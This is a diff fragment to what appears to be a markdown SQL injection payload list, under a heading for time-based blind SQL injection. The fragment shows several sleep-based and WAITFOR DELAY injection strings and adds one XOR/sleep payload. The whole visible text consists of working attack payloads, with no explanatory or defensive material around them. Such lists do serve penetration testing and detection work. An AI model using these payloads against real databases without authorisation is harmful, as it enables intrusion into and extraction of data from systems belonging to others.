@@ -3,6 +3,7 @@
 '(select * from (select(sleep(10)))a)
 ,(select*from(select(sleep(15)))a)
 ';WAITFOR DELAY '0:0:30'--
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 ```
 ## Boolean Based Blind SQL Injection:
 ```
